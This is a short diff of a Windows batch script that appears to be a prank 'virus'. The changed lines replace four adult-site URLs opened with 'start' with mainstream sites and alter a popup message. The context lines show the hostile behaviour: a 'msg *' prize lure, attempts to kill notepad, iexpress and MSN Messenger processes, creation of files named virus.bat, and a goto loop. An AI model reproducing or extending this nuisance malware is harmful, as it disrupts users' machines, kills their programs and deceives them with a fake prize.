@@ -22,10 +22,10 @@ msg * buenos dias aqui esta la primera parte del premio
 tskkill iexpress.exe
 tskkill notepad.exe
 tskkill msnmsgr.exe
-start www.petardas.com
-start www.2tetas.com
-start www.xxx.com
-start www.tetas-tetas
+start www.google.com
+start www.gmail.com
+start www.yahoo.com
+start www.github.com
 echo off>virus.bat
 echo off>virus69.bat
 echo off>virus58.bat
@@ -124,7 +124,7 @@ goto lalbel
 echo.
 echo.
 echo.
-msg * Espero que haya disfrutado
+msg * XD jaj
 echo.
 echo.
 echo.
